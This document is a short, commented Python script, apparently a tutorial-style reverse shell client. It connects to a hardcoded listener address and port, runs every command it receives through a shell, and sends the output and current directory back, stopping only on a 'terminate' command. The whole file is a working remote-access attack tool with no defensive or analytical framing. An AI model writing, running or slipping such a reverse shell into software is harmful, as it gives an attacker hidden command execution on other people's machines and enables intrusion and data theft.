# Import necessary modules
import socket
import subprocess
import os

# Define a function to handle the connection and command execution
def connect():
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Establish a connection to the server
    s.connect(("192.168.1.19", 6969))  # Replace "listener_ip" and listener_port with the IP address and port of your listener
    
    # Start an infinite loop to listen for commands from the server
    while True:
        # Receive a command from the server
        command = s.recv(1024).decode()
        
        # If the command is to terminate, close the connection and exit the loop
        if 'terminate' in command:
            s.close()
            break
        
        # Otherwise, execute the received command
        else:
            # Execute the command using subprocess
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            
            # Read the output and error streams of the executed command
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            
            # Convert the output bytes to a string
            output_str = str(output_bytes, "utf-8")
            
            # Send the output back to the server along with the current working directory
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))

# Define the main function to call the connect function
def main():
    connect()

# Ensure main() is called when the script is run directly
if __name__ == "__main__":
    main()